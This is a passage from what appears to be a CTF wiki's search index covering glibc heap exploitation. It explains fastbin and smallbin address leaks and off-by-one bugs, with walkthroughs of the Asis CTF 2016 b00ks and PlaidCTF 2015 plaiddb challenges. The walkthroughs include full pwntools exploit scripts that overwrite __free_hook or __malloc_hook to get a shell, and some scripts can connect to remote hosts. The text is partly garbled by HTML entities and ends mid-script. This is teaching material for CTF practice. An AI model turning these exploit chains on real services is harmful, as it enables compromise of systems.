at the end of the fastbin list is 0, after which the fd field of each block points to the previous block. Therefore, only the base address of the heap can be leaked by fastbin.","title":"fastbin"},{"location":"pwn/linux/glibc-heap/leak_heap/#smallbin","text":"We constructed two fastbins and looked at their memory. Now there are two blocks in the fastbin list. The address of the first block is 0x602000 and the address of the second block is 0x6020f0. 0x602000: 0x0000000000000000 0x00000000000000d1 0x602010: 0x00007ffff7dd1c38 0x00000000006020f0 &lt;=== Address of the next block 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x6020f0: 0x0000000000000000 0x00000000000000d1 0x602100: 0x0000000000602000 0x00007ffff7dd1c38 &lt;=== address of main_arena 0x602110: 0x0000000000000000 0x0000000000000000 0x602120: 0x0000000000000000 0x0000000000000000 Therefore, through the smallbin can get: 1.libc.so base address 2.heap base address","title":"smallbin"},{"location":"pwn/linux/glibc-heap/leak_heap/#which-vulnerabilities-can-be-used-for-leaks","text":"Through the previous knowledge, we can know what address information exists in the heap, but to obtain these addresses, we need to implement the vulnerability. Generally speaking, the following vulnerabilities are available for information vulnerabilities. heap memory is not initialized Heap overflow Use-After-Free Cross-border reading heap extend","title":"Which vulnerabilities can be used for leaks"},{"location":"pwn/linux/glibc-heap/leak_heap/#0x01-read-uaf","text":"By, UAF, leaking heapbase: p0 = malloc ( 0x20 ); p1 = malloc ( 0x20 ); free ( p0 ); free ( p1 ); printf ( ' heap base : % p ' , * p1 ); Due to the nature of the fastbin list, when we construct a fastbin list ( 0x30 ) fastbin [ 1 ] : 0x602030 --> 0x602000 --> 0x0 There is a phenomenon of chunk 1 -> chunk 0. If the UAF vulnerability exists at this time, we can print the address of chunk 0 through show chunk 1. Similarly, leaking libc base p0 = malloc ( 0x100 ); free ( p0 ); printf ( \"libc: %p \\n \" , * p0 );","title":"## 0x01 read UAF"},{"location":"pwn/linux/glibc-heap/leak_heap/#0x02-overlapping-chunks","text":"","title":"0x02  overlapping chunks"},{"location":"pwn/linux/glibc-heap/leak_heap/#0x03-partial-overwrite","text":"","title":"0x03 Partial Overwrite"},{"location":"pwn/linux/glibc-heap/leak_heap/#0x04-relative-write","text":"","title":"0x04 Relative Write"},{"location":"pwn/linux/glibc-heap/off_by_one/","text":"Off-By-One in the heap \u00b6 Introduction \u00b6 Strictly speaking, the off-by-one vulnerability is a special type of overflow vulnerability. Off-by-one means that when a program writes to a buffer, the number of bytes written exceeds the number of bytes requested by the buffer itself. And only one byte is crossed. off-by-one Vulnerability Principle \u00b6 Off-by-one refers to a single-byte buffer overflow. This vulnerability is often related to the lack of strict boundary verification and string operations. Of course, it does not rule out that the size of the write is just one byte more. Where the boundary verification is not strict, usually includes When writing data to a heap block using a loop statement, the number of loops set incorrectly (which is common in C language beginners) results in more than one byte being written. String operation is not appropriate In general, single-byte overflows are considered to be difficult to exploit, but because of the looseness of Linux's heap management mechanism ptmalloc validation, Linux-based off-by-one exploits are not complex and powerful. In addition, the point to note is that off-by-one can be based on various buffers, such as stacks, bss segments, etc., but the heap-based off-by-one is more common in CTFs. We will only discuss the off-by-one situation on the heap here. off-by-one Use ideas \u00b6 The overflow byte is any byte that can be controlled: by modifying the size, there is overlap between the block structures, thereby leaking other block data or overwriting other block data. You can also use the NULL byte overflow method. The overflow byte is NULL. When the size is 0x100, overflowing the NULL byte makes the prev_in_use bit clear, so the previous block is considered a free block. (1) At this point you can choose to use the unlink method (see the unlink section) for processing. (2) In addition, when the prev_size field is enabled, you can forge prev_size , causing overlap between blocks. The key to this method is that unlink does not check whether the last block of the block found by prev_size (theoretically the block currently unlinked) is equal to the block size currently being unlinked. In the latest version of the code, the check for the latter method in 2 has been added, but the check was not available before 2.28. /* consolidate backward */ if (!prev_inuse(p)) { prevsize = prev_size (p); size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); /* The last two lines of code are added in the latest version, then the second method of 2 is not available, but there is no problem in 2.28 and before*/ if (__glibc_unlikely (chunksize(p) != prevsize)) malloc_printerr (\"corrupted size vs. prev_size while consolidating\"); unlink_chunk (av, p); } Example 1 \u00b6 int my_gets(char *ptr,int size) { int i; for(i=0;i<=size;i++) { ptr[i]=getchar(); } return i; } int main() { void *chunk1,*chunk2; chunk1=malloc(16); chunk2=malloc(16); puts(\"Get Input:\"); my_gets(chunk1,16); return 0; } Our own my_gets function caused an off-by-one vulnerability because the boundaries of the for loop were not controlled enough to cause writes to be executed once, which is also called a fence error. wikipedia: > Fence errors (sometimes called pole errors or lamppost errors) are a type of error. Such as the following questions: > Build a straight fence (ie no circle), 30 meters long, 3 meters apart between each fence column, how many fence posts do you need? > The easiest answer 10 is wrong. This fence has 10 intervals and 11 fence posts. We use gdb to debug the program. Before inputting, we can see that the two allocated user areas are 16-byte heap blocks. 0x602000: 0x0000000000000000 0x0000000000000021 <=== chunk1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000021 <=== chunk2 0x602030: 0x0000000000000000 0x0000000000000000 When we execute my_gets for input, we can see that the data has overflowed to cover the prev_size field of the next heap. print 'A'*17 0x602000: 0x0000000000000000 0x0000000000000021 <=== chunk1 0x602010: 0x4141414141414141 0x4141414141414141 0x602020: 0x0000000000000041 0x0000000000000021 <=== chunk2 0x602030: 0x0000000000000000 0x0000000000000000 Example 2 \u00b6 The second common scenario that causes off-by-one is string manipulation. The common reason is that the end of the string is incorrectly calculated. int main(void) { char buffer[40]=\"\"; void *chunk1; chunk1=malloc(24); puts(\"Get Input\"); gets(buffer); if(strlen(buffer)==24) { strcpy(chunk1,buffer); } return 0; } At first glance, the program doesn't seem to have any problems (regardless of stack overflow), and many people may write it in the actual code as well. However, the behavior of strlen and strcpy is inconsistent, which leads to the occurrence of off-by-one. Strlen is a function we are familiar with calculating the length of an ascii string. This function does not count the terminator &#39;\\x00&#39; when calculating the length of a string, but strcpy copies the terminator when copying a string. '\\x00'`. This caused us to write 25 bytes to chunk1, which we can see with gdb debugging. 0x602000: 0x0000000000000000 0x0000000000000021 <=== chunk1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000411 <=== next chunk Execute strcpy after we type 'A'*24 0x602000: 0x0000000000000000 0x0000000000000021 0x602010: 0x4141414141414141 0x4141414141414141 0x602020: 0x4141414141414141 0x0000000000000400 You can see that the low byte of the size field of the next chunk is overwritten by the terminator &#39;\\x00&#39; . This branch of the off-by-one is called NULL byte off-by-one, which we will see later. The difference between off-by-one and NULL byte off-by-one. There is still one thing why the low byte is overwritten, because the byte order of the CPU we usually use is small endian, such as a DWORD value stored in the memory using the little endian method. DWORD 0x41424344 Memory 0x44, 0x43, 0x42, 0x41 \u5b9e\u4f8b 1: Asis CTF 2016 b00ks \u00b6 Title introduction \u00b6 The topic is a common menu-style program that features a library management system. 1. Create a book 2. Delete a book 3. Edit a book 4. Print book detail 5. Change current author name 6. Exit The program provides the ability to create, delete, edit, and print books. The title is a 64-bit program and the protection is as follows. Canary : No NX : Yes PIE : Yes Fortify : No RelRO : Full Each time a program creates a program, it allocates a 0x20 byte structure to maintain its information. struct book { int id; char *name; char *description; int size; } create \u00b6 Name and description exist in the book structure, and name and description are allocated on the heap. First allocate the name buffer, use malloc, the size is custom but less than 32. printf(\"\\nEnter book name size: \", *(_QWORD *)&size); __isoc99_scanf(\"%d\", &size); printf(\"Enter book name (Max 32 chars): \", &size); ptr = malloc(size); The description is then assigned, the same size is customizable but unlimited. printf(\"\\nEnter book description size: \", *(_QWORD *)&size); __isoc99_scanf(\"%d\", &size); v5 = malloc(size); After allocating the memory of the book structure book = malloc(0x20uLL); if ( book ) { *((_DWORD *)book + 6) = size; *((_QWORD *)off_202010 + v2) = book; *((_QWORD *)book + 2) = description; *((_QWORD *)book + 1) = name; *(_DWORD *)book = ++unk_202024; return 0LL; } Vulnerability \u00b6 There is a null byte off-by-one vulnerability in the read function of the program. If you look closely at the read function, you can find that the consideration of the boundary is not appropriate. signed __int64 __fastcall my_read(_BYTE *ptr, int number) { int i; // [rsp+14h] [rbp-Ch] _BYTE *buf; // [rsp+18h] [rbp-8h] if ( number <= 0 ) return 0LL; buf = ptr; for ( i = 0; ; ++i ) { if ( (unsigned int)read(0, buf, 1uLL) != 1 ) return 1LL; if ( *buf == '\\n' ) break; ++ buf; if ( i == number ) break; } * buf = 0; return 0LL; } Use \u00b6 Leak \u00b6 Because the my_read function in the program has a null byte off-by-one , in fact the terminator '\\x00' read by my_read is written to 0x555555756060. This will overwrite the terminator '\\x00' when 0x555555756060~0x555555756068 is written to the book pointer, so there is a vulnerability in the address leak. The value of the first item in the pointer array can be obtained by printing the author name. 0x555555756040: 0x6161616161616161 0x6161616161616161 0x555555756050: 0x6161616161616161 0x6161616161616161 <== author name 0x555555756060: 0x0000555555757480 <== pointer array 0x0000000000000000 0x555555756070: 0x0000000000000000 0x0000000000000000 0x555555756080: 0x0000000000000000 0x0000000000000000 In order to achieve the leak, first enter 32 bytes in the author name to make the terminator overwritten. After that we create book1, the pointer of book1 will overwrite the last NULL byte in author name, so that the pointer is directly connected with author name, so that the output author name can get a heap pointer. io.recvuntil('Enter author name:') # input author name io.sendline (&#39;a&#39; * 32) io.recvuntil (&#39;&gt;&#39;) # create book1 io.sendline ( &#39;1&#39;) io.recvuntil('Enter book name size:') io.sendline (&#39;32 &#39;) io.recvuntil('Enter book name (Max 32 chars):') io.sendline('object1') io.recvuntil('Enter book description size:') io.sendline (&#39;32 &#39;) io.recvuntil('Enter book description:') io.sendline('object1') io.recvuntil (&#39;&gt;&#39;) # print book1 io.sendline ( &#39;4&#39;) io.recvuntil ( &#39;Author:&#39;) io.recvuntil (&#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;) # &lt;== leak book1 book1_addr = io.recv (6) book1_addr = book1_addr.ljust (8, &#39;x00&#39;) book1_addr = u64(book1_addr) off-by-one Override pointer low byte \u00b6 The change function is also provided in the program. The change function is used to modify the author name, so the change can be used to write the author name, and the off-by-one is used to override the low byte of the first item of the pointer array. After overwriting the low byte of the book1 pointer, this pointer points to the description of book1. Since the program provides the edit function, the content in the description can be arbitrarily modified. We can pre-define the data in the description to create a book structure. The description and name pointers of this book structure can be directly controlled. def off_by_one(addr): addr += 58 io.recvuntil('>')# create fake book in description io.sendline ( &#39;3&#39;) fake_book_data = p64(0x1) + p64(addr) + p64(addr) + pack(0xffff) io.recvuntil('Enter new book description:') io.sendline(fake_book_data) # <== fake book io.recvuntil('>') # change author name io.sendline ( &#39;5&#39;) io.recvuntil('Enter author name:') io.sendline('a' * 32) # <== off-by-one Here, the book is forged in the description, and the data used is p64(0x1)+p64(addr)+p64(addr)+pack(0xffff). Where addr+58 is to point the pointer to the pointer address of book2, so that we can modify these pointer values arbitrarily. Using the stack to achieve utilization \u00b6 Through the previous two parts, we have obtained the ability to read and write at any address. The reader may find that the following operations are obvious, such as writing the get table hijacking process or writing the __malloc_hook hijacking process. But the special thing about this topic is that PIE is turned on and there is no way to leak the libc base address, so we need to think about other methods. The clever thing about this is that when you allocate a second book, use a large size to make the heap expand in mmap mode. We know that there are two ways to expand the heap. One is that brk will directly expand the original heap, and the other is that mmap will map a piece of memory separately. Here we apply for an oversized block to extend memory using mmap. Because the memory allocated by mmap has a fixed offset from libc, the base address of libc can be derived. Start End Offset Perm Path 0x0000000000400000 0x0000000000401000 0x0000000000000000 rx /home/vb/ Desktop/123/123 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/ Desktop/123/123 0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/ Desktop/123/123 0x00007f8d638a3000 0x00007f8d63a63000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so 0x00007f8d63a63000 0x00007f8d63c63000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007f8d63c63000 0x00007f8d63c67000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007f8d63c67000 0x00007f8d63c69000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007f8d63c69000 0x00007f8d63c6d000 0x0000000000000000 rw- 0x00007f8d63c6d000 0x00007f8d63c93000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so 0x00007f8d63e54000 0x00007f8d63e79000 0x0000000000000000 rw- <=== mmap 0x00007f8d63e92000 0x00007f8d63e93000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007f8d63e93000 0x00007f8d63e94000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007f8d63e94000 0x00007f8d63e95000 0x0000000000000000 rw- 0x00007ffdc4f12000 0x00007ffdc4f33000 0x0000000000000000 rw- [stack] 0x00007ffdc4f7a000 0x00007ffdc4f7d000 0x0000000000000000 r-- [vvar] 0x00007ffdc4f7d000 0x00007ffdc4f7f000 0x0000000000000000 r-x [vdso] 0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall] Start End Offset Perm Path 0x0000000000400000 0x0000000000401000 0x0000000000000000 rx /home/vb/ Desktop/123/123 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/ Desktop/123/123 0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/ Desktop/123/123 0x00007f6572703000 0x00007f65728c3000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so 0x00007f65728c3000 0x00007f6572ac3000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007f6572ac3000 0x00007f6572ac7000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007f6572ac7000 0x00007f6572ac9000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007f6572ac9000 0x00007f6572acd000 0x0000000000000000 rw- 0x00007f6572acd000 0x00007f6572af3000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so 0x00007f6572cb4000 0x00007f6572cd9000 0x0000000000000000 rw- <=== mmap 0x00007f6572cf2000 0x00007f6572cf3000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007f6572cf3000 0x00007f6572cf4000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007f6572cf4000 0x00007f6572cf5000 0x0000000000000000 rw- 0x00007fffec566000 0x00007fffec587000 0x0000000000000000 rw- [stack] 0x00007fffec59c000 0x00007fffec59f000 0x0000000000000000 r-- [vvar] 0x00007fffec59f000 0x00007fffec5a1000 0x0000000000000000 r-x [vdso] 0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall] exploit \u00b6 from pwn import * context . log_level = \"info\" binary = ELF ( \"b00ks\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) io = process ( & quot ; ./ b00ks & quot ;) def createbook ( name_size , name , des_size , des ): io . readuntil ( & quot ; & gt ; & quot ;) io . sendline ( & quot ; 1 & quot ;) io . readuntil ( & quot ;: & quot ;) io . sendline ( str ( name_size )) io . readuntil ( & quot ;: & quot ;) io . sendline ( name ) io . readuntil ( & quot ;: & quot ;) io . sendline ( str ( des_size )) io . readuntil ( & quot ;: & quot ;) io . sendline ( des ) def printbook ( id ): io . readuntil ( & quot ; & gt ; & quot ;) io . sendline ( & quot ; 4 & quot ;) io . readuntil ( & quot ;: & quot ;) for i in range ( id ): book_id = int ( io . readline ()[: - 1 ]) io . readuntil ( & quot ;: & quot ;) book_name = io . readline ()[: - 1 ] io . readuntil ( & quot ;: & quot ;) book_des = io . readline () [: - 1 ] io . readuntil ( & quot ;: & quot ;) book_author = io . readline ()[: - 1 ] return book_id , book_name , book_des , book_author def createname ( name ): io . readuntil ( & quot ; name : & quot ;) io . sendline ( name ) def changename ( name ): io . readuntil ( & quot ; & gt ; & quot ;) io . sendline ( & quot ; 5 & quot ;) io . readuntil ( & quot ;: & quot ;) io . sendline ( name ) def editbook ( book_id , new_des ): io . readuntil ( & quot ; & gt ; & quot ;) io . sendline ( & quot ; 3 & quot ;) io . readuntil ( & quot ;: & quot ;) io . writeline ( str ( book_id )) io . readuntil ( & quot ;: & quot ;) io . sendline ( new_des ) def deletebook ( book_id ): io . readuntil ( & quot ; & gt ; & quot ;) io . sendline ( & quot ; 2 & quot ;) io . readuntil ( & quot ;: & quot ;) io . sendline ( str ( book_id )) createname ( \"A\" * 32 ) createbook ( 128 , \"a\" , 32 , \"a\" ) createbook ( 0x21000 , \"a\" , 0x21000 , \"b\" ) book_id_1 , book_name , book_des , book_author = printbook ( 1 ) book1_addr = u64 ( book_author [ 32 : 32 + 6 ] . ljust ( 8 , ' \\x00 ' )) log . success ( \"book1_address:\" + hex ( book1_addr )) payload = p64 ( 1 ) + p64 ( book1_addr + 0x38 ) + p64 ( book1_addr + 0x40 ) + p64 ( 0xffff ) editbook ( book_id_1 , payload ) changename ( \"A\" * 32 ) book_id_1 , book_name , book_des , book_author = printbook ( 1 ) book2_name_addr = u64 ( book_name . ljust ( 8 , \" \\x00 \" )) book2_des_addr = u64 ( book_des . ljust ( 8 , & quot ; x00 & quot ;)) log . success ( \"book2 name addr:\" + hex ( book2_name_addr )) log . success ( \"book2 des addr:\" + hex ( book2_des_addr )) libc_base = book2_des_addr - 0x5b9010 log . success ( \"libc base:\" + hex ( libc_base )) free_hook = libc_base + libc . symbols [ \"__free_hook\" ] one_gadget = libc_base + 0x4f322 # 0x4f2c5 0x10a38c 0x4f322 log . success ( \"free_hook:\" + hex ( free_hook )) log . success ( \"one_gadget:\" + hex ( one_gadget )) editbook ( 1 , p64 ( free_hook ) * 2 ) editbook ( 2 , p64 ( one_gadget )) deletebook ( 2 ) io . interactive () Simple plan \u00b6 After any read and write, another way to find libc is to first cause the libc address to be written on the heap before any read and write, and then read it out by any read. In order to find the offset where libc is located, you can debug directly through gdb to view the location of the specific libc address on the heap, without deliberate calculation. Exp is as follows: #! /usr/bin/env python2 # -*- coding: utf-8 -*- # vim: hay = utf-8 import sys import import os.path from pwn import * context(os='linux', arch='amd64', log_level='debug') if len(sys.argv) > 2: DEBUG = 0 HOST = sys.argv[1] PORT = int(sys.argv[2]) p = remote(HOST, PORT) else: DEBUG = 1 if len(sys.argv) == 2: PATH = sys.argv[1] p = process(PATH) def cmd(choice): p.recvuntil('> ') p.sendline(str(choice)) def create(book_size, book_name, desc_size, desc): cmd(1) p.recvuntil(': ') p.sendline(str(book_size)) p.recvuntil(': ') if len(book_name) == book_size: p.send(book_name) else: p.sendline(book_name) p.recvuntil(': ') p.sendline(str(desc_size)) p.recvuntil(': ') if len(desc) == desc_size: p.send(desc) else: p.sendline(desc) def remove(idx): cmd(2) p.recvuntil(': ') p.sendline(str(idx)) def edit(idx, desc): cmd(3) p.recvuntil(': ') p.sendline(str(idx)) p.recvuntil(': ') p.send(desc) def author_name(author): cmd(5) p.recvuntil(': ') p.send(author) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') def main(): # Your exploit script goes here # leak heap address p.recvuntil('name: ') p.sendline('x' * (0x20 - 5) + 'leak:') create(0x20, 'tmp a', 0x20, 'b') # 1 cmd(4) p.recvuntil('Author: ') p.recvuntil('leak:') heap_leak = u64(p.recvline().strip().ljust(8, '\\x00')) p.info('heap leak @ 0x%x' % heap_leak) heap_base = heap_leak - 0x1080 create(0x20, 'buf 1', 0x20, 'desc buf') # 2 create(0x20, 'buf 2', 0x20, 'desc buf 2') # 3 remove(2) remove(3) ptr = heap_base + 0x1180 payload = p64 (0) + p64 (0x101) + p64 (ptr - 0x18) + p64 (ptr - 0x10) + &#39;\\ x00&#39; create(0x20, 'name', 0x108, 'overflow') # 4 create(0x20, 'name', 0x100 - 0x10, 'target') # 5 create(0x20, '/bin/sh\\x00', 0x200, 'to arbitrary read write') # 6 edit(4, payload) # overflow remove(5) # unlink edit(4, p64(0x30) + p64(4) + p64(heap_base + 0x11a0) + p64(heap_base + 0x10c0) + '\\n') def write_to(addr, content, size): edit(4, p64(addr) + p64(size + 0x100) + '\\n') edit(6, content + '\\n') def read_at(addr): edit(4, p64(addr) + '\\n') cmd(4) p.recvuntil('Description: ') p.recvuntil('Description: ') p.recvuntil('Description: ') content = p.recvline()[:-1] p.info(content) return content libc_leak = u64(read_at(heap_base + 0x11e0).ljust(8, '\\x00')) - 0x3c4b78 p.info('libc leak @ 0x%x' % libc_leak) write_to(libc_leak + libc.symbols['__free_hook'], p64(libc_leak + libc.symbols['system']), 0x10) remove(6) p.interactive() if __name__ == '__main__': main() Instance 2 : plaidctf 2015 plaiddb \u00b6 \u279c 2015_plaidctf_datastore git: ( master ) file datastore datastore: ELF 64 -bit LSB shared object, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.24, BuildID [ sha1 ]= 1a031710225e93b0b5985477c73653846c352add, stripped \u279c 2015_plaidctf_datastore git: ( master ) checksec datastore [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/off_by_one/2015_plaidctf_datastore/datastore' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled \u279c 2015_plaidctf_datastore git: ( master ) As you can see, the program is 64-bit dynamically linked. The protection is all turned on. Functional Analysis \u00b6 Key data structure: struct Node { char * key; long data_size; char *data; struct Node *left; struct Node *right; long dummy; long dummy1; } The structure of the binary tree is mainly used to store data, and the specific storage process does not affect the utilization. The function function needs to pay attention to getline (self-implemented single-line read function): char *__fastcall getline(__int64 a1, __int64 a2) { char *v2; // r12 char * v3; // rbx size_t v4; // r14 char v5; // al char v6; // bp signed __int64 v7; // r13 char *v8; // rax V2 = (char *)malloc(8uLL); // Initially use malloc(8) for allocation v3 = v2; V4 = malloc_usable_size(v2); // Calculated the available size, for example, for malloc(8), this should be 24 while ( 1 ) { v5 = _IO_getc(stdin); v6 = v5; if ( v5 == -1 ) bye(); if ( v5 == 10 ) break; v7 = v3 - v2; if ( v4 <= v3 - v2 ) { V8 = (char *)realloc(v2, 2 * v4); // The size is not enough to multiply the available size by two for realloc v2 = v8; if ( !v8 ) { puts(\"FATAL: Out of memory\"); exit(-1); } v3 = &amp; v8 [v7]; v4 = malloc_usable_size(v8); } *v3++ = v6; // &lt;--- The vulnerability is where v3 is indexed and points to the next location. If the location is all used, it will point to the next non-writeable location. } *v3 = 0; // &lt;--- The vulnerability is located. Off by one (NULL byte overflow) return v2; } Several main features: unsigned __int64 main_fn() { char v1[8]; // [rsp+0h] [rbp-18h] unsigned __int64 v2; // [rsp+8h] [rbp-10h] v2 = __readfsqword(0x28u); puts(\"PROMPT: Enter command:\"); gets_checked(v1, 8LL); if ( !strcmp(v1, \"GET\\n\") ) { cmd_get(); } else if ( !strcmp(v1, \"PUT\\n\") ) { cmd_put(); } else if ( !strcmp(v1, \"DUMP\\n\") ) { cmd_dump(); } else if ( !strcmp(v1, \"DEL\\n\") ) { cmd_del(); } else { if ( !strcmp(v1, \"EXIT\\n\") ) bye(); __printf_chk(1LL, \"ERROR: '%s' is not a valid command.\\n\", v1); } return __readfsqword(0x28u) ^ v2; } Both dump and get are used to read the content, so key and specific data content can be read, and less attention is needed. Focus on put and del : __int64 __fastcall cmd_put() { __int64 v0; // rsi Node *row; // rbx unsigned __int64 sz; // rax char * v3; // rax __int64 v4; // rbp __int64 result; // rax __int64 v6; // [rsp+0h] [rbp-38h] unsigned __int64 v7; // [rsp+18h] [rbp-20h] v7 = __readfsqword(0x28u); row = (Node *)malloc(0x38uLL); if ( !row ) { puts(\"FATAL: Can't allocate a row\"); exit(-1); } puts(\"PROMPT: Enter row key:\"); row->key = getline((__int64)\"PROMPT: Enter row key:\", v0); puts(\"PROMPT: Enter data size:\"); gets_checked((char *)&v6, 16LL); sz = strtoul((const char *)&v6, 0LL, 0); row->data_size = sz; v3 = (char *)malloc(sz); row->data = v3; if ( v3 ) { puts(\"PROMPT: Enter data:\"); fread_checked(row->data, row->data_size); v4 = insert_node(row); if ( v4 ) { free(row->key); free(*(void **)(v4 + 16)); *(_QWORD *)(v4 + 8) = row->data_size; *(_QWORD *)(v4 + 16) = row->data; free(row); puts(\"INFO: Update successful.\"); } else { puts(\"INFO: Insert successful.\"); } result = __readfsqword(0x28u) ^ v7; } else { puts(\"ERROR: Can't store that much data.\"); free(row->key); free(row); } return result; } The distribution process is: Malloc (0x38) (structure) 2. getline (malloc \u548c realloc) malloc (size) controllable size Read the size byte content The more complicated part we can see later will be used, that is, the part about free used in put For deletion, this function is more complicated and will not be explained in detail. In fact, you only need to know that he is deleted according to the key, and the key is read using getline . If there is no such key, the part of getline will not be deleted. If any, then free Exploit Analysis \u00b6 The location of the vulnerability has been pointed out in the functional analysis, in getline , but the special feature of this function is that its allocated size is gradually increasing, by increasing the available size by two, using realloc , that is, if we want to trigger this vulnerability, we need to meet certain size requirements. According to the allocation process, the size of the satisfaction is: 0x18 0x38 0x78 0xf8 0x1f8 ... These sizes can trigger an overflow. Now we need to know the specific methods we need to adopt. First, the off-by-one vulnerability can cause heap crossover, which can cause the libc address to leak. Afterwards, the utilization method to be used, because there is already a heap crossover, that is, a UAF can be formed, and the UAF common method can be used. The easiest way to get a UAF vulnerability is of course fastbin attack, so I used fastbin attack. Here, we can begin to think about how to form the conditions of use we need. The final effect of off-by-one is that you can release a smallbin chunk or unsortedbin chunk of a released state until it is merged into a large chunk by the overflow chunk. That is: +------------+ | | &lt;-- free unsortedbin or smallbin chunk (because fd and bk point to legal pointers at this time, unlink can be done) +------------+ | ... | &lt;-- arbitrary chunk +------------+ | | &lt;-- Chunk for overflow +------------+ | vuln | &lt;-- The chunk that was overflowed, the size is 0x_00 (eg 0x100, 0x200...) +------------+ After the use of off-by-one , the chunks that appear above will be merged into a freed chunk. If the position of any intermediate chunk is already allocated, it can cause overlap. According to our utilization ideas, combined with the topic getline function through malloc(8) and then realloc , we need to: At least one chunk of any chunk location has been allocated, and the chunk of data can be read to leak the libc address. The chunk that overflows needs to be allocated before the top chunk, otherwise malloc(8) will be allocated to the top instead of where the chunk should be. Any chunk location needs at least one chunk that has been released and has a size of 0x71 for fastbin attack All chunks should not be merged into top, so there should be an already allocated chunk at the bottom to guarantee the distance from the top chunk. The size of the chunk that overflows should belong to unsortedbin or smallbin. It cannot be fastbin. Otherwise, after being released, according to the allocation method of getline , malloc(8) cannot be allocated at this location. According to the above principles, we can think about the distribution of chunks as follows: +------------+ | 1 | <-- free \u7684 size == 0x200 chunk +------------+ | 2 | &lt;-- size == 0x60 fastbin chunk, has been allocated, and can read data +------------+ | 5 | &lt;-- size == 0x71 fastbin chunk, ready for fastbin attack +------------+ | 3 | <-- size == 0x1f8 free \u72b6\u6001\u7684 smallbin/unsortedbin chunk +------------+ | 4 | &lt;-- size == 0x101 is overflowed chunk +------------+ | X | &lt;-- arbitrarily allocated chunks prevent top merge +------------+ Since the allocation process has some additional structure (the allocation of the structure itself and getline ), we need to release enough fastbin chunks to avoid the allocation of the structure itself affecting our process. After that, release 5, 3, 1, and then use delline when del is input, fill 3, causing off-by-one , then merge 4 free to merge (forgery prev_size ), so there is a cross heap structure. The process is much simpler. First allocate the size of 1 so that the libc address is written to 2, you can leak the address, then allocate 5 and write the required content, you can fastbin attack. exploit \u00b6 Since the original libc is 2.19 version, loading some strange problems is more troublesome, and this problem does not use the unique features of 2.19, so I used the 2.23 libc for debugging, the version is ubuntu10. #! /usr/bin/env python2 # -*- coding: utf-8 -*- # vim:fenc=utf-8 import sys import os import os.path from pwn import * context ( os = 'linux' , arch = 'amd64' , log_level = 'debug' ) if len ( sys . argv ) > 2 : DEBUG = 0 HOST = sys . argv [ 1 ] PORT = int ( sys . argv [ 2 ]) p = remote ( HOST , PORT ) else : DEBUG = 1 if len ( sys . argv ) == 2 : PATH = sys . argv [ 1 ] p = process ( PATH ) libc = ELF ( '/lib/x86_64-linux-gnu/libc.so.6' ) # ubuntu 16.04 def cmd ( command_num ): p . recvuntil ( 'command:' ) p . sendline ( str ( command_num )) def put ( key , size , data ): cmd ( 'PUT' ) p . recvuntil ( 'key:' ) p . sendline ( key ) p . recvuntil ( 'size:' ) p . sendline ( str ( size )) p . recvuntil ( 'data:' ) if len ( data ) < size : p . send ( data . ljust ( size , ' \\x00 ' )) else : p . send ( data ) def delete ( key ): cmd ( 'DEL' ) p . recvuntil ( 'key:' ) p . sendline ( key ) def get ( key ): cmd ( 'GET' ) p . recvuntil ( 'key:' ) p . sendline ( key ) p . recvuntil ( '[' ) num = int ( p . recvuntil ( ' bytes' ) . strip ( ' bytes' )) p . recvuntil ( ': \\n ' ) return p . recv ( num ) def main (): # avoid complicity of structure malloc for i in range ( 10 ): put ( str ( i ), 0x38 , str ( i )) for i in range ( 10 ): delete ( str ( i )) # allocate what we want in order put ( '1' , 0x200 , '1' ) put ( '2' , 0x50 , '2' ) put ( '5' , 0x68 , '6' ) put ( '3' , 0x1f8 , '3' ) put ( '4' , 0xf0 , '4' ) put ( 'defense' , 0x400 , 'defense-data' ) # free those need to be freed delete ( '5' ) delete ( '3' ) delete ( '1' ) delete ( 'a' * 0x1f0 + p64 ( 0x4e0 )) delete ( '4' ) put ( '0x200' , 0x200 , 'fillup' ) put ( '0x200 fillup' , 0x200 , 'fillup again' ) libc_leak = u64 ( get ( '2' )[: 6 ] . ljust ( 8 , ' \\x00 ' )) p . info ( 'libc leak: 0x %x ' % libc_leak ) libc_base = libc_leak - 0x3c4b78 p . info ( 'libc_base: 0x %x ' % libc_base ) put ( 'fastatk' , 0x100 , 'a' * 0x58 + p64 ( 0x71 ) + p64 ( libc_base + libc . symbols [ '__malloc_hook' ] - 0x10 + 5 - 8 )) put 